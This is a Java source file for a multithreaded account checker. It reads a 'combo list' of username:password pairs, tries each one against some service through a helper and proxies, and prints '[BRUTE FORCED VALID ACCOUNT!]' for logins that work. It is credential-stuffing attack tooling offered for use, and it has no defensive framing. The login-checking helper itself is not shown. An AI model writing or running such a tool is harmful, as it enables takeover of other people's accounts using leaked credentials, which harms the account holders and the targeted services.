import utils.AccType;
import utils.Utils;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

public class ThreadedShit implements Runnable {
    private Thread t;
    private File comboList;

    @Override
    public void run() {
        Utils utils = new Utils();
        int localCounter = 0;
        try {
            Scanner scanner = new Scanner(comboList);
            while (scanner.hasNextLine()) {
                if (localCounter == Main.counter) {
                    String line = scanner.nextLine();
                    if (line.contains(":")) {
                        List<String> details = Arrays.asList(line.split(":"));
                        AccType checked = utils.checkAccount(details.get(0), details.get(1));
                        if (checked != null) {
                            if (checked.equals(AccType.VALID)) {
                                System.out.println("[BRUTE FORCED VALID ACCOUNT!] " + line);
                            } else if (checked.equals(AccType.INVALID)) {
                                System.out.println("[INVALID] " + line);
                            } else if (checked.equals(AccType.REQUEST_ERROR)) {
                                System.out.println("THERE WAS A REQUEST ERROR USING THIS PROXY.");
                            }
                        }
                    } else {
                        System.out.println("INVALID ACCOUNT COMBO: " + line);
                    }
                    localCounter++; Main.counter++;
                } else {
                    scanner.nextLine();
                    localCounter++;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void start(File list) {
        comboList = list;
        if (t == null) {
            t = new Thread(this);
            t.start();
        }
    }
}
